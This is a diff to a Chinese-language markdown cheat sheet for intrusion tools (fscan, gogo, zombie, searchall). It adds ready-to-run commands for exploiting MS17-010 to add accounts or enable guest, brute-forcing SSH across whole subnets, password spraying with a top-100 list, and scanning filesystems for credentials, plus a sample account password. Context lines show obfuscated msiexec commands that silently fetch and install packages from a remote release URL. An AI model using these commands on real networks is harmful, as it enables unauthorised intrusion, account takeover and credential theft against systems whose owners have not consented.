@@ -4,6 +4,15 @@
 建议直接[Ctrl+F]查找
 
 ## fscan
+常用命令
+```
+fscan -h x.x.x.x -m ms17010 -sc add 
+fscan -h x.x.x.x -m ms17010 -sc guest
+sysadmin/1qaz@WSX!@#4
+guest/1qaz@WSX!@#4
+./fscan -h 192.168.0.0/16 -userf user -pwdf pwd -m ssh -p 22
+```
+
 Linux amd
 ```
 64
@@ -94,6 +103,14 @@ msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/dow
 ```
 
 ## gogo
+常用命令
+```
+gogo -w ss -i 172.16.0.0/12 -ev
+gogo -w s -i 192.168.0.0/16 -ev
+gogo -w 10 -ev
+./gogo -F .192.168.0.0.16_all_s_jl.dat
+```
+
 Linux amd
 
 ```
@@ -166,6 +183,11 @@ msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/dow
 ```
 
 ## zombie
+zombie常用命令
+```
+./zombie_linux_amd64 --gogo .192.168.0.0.16_all_s_jl.dat -P top100.txt 
+```
+
 Linux amd
 
 ```
@@ -256,6 +278,12 @@ msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/dow
 ```
 
 ## searchall
+searchall常用命令
+```
+./searchall64 search -p /
+searchall64.exe search -p C:/
+```
+
 Linux amd
 ```
 64
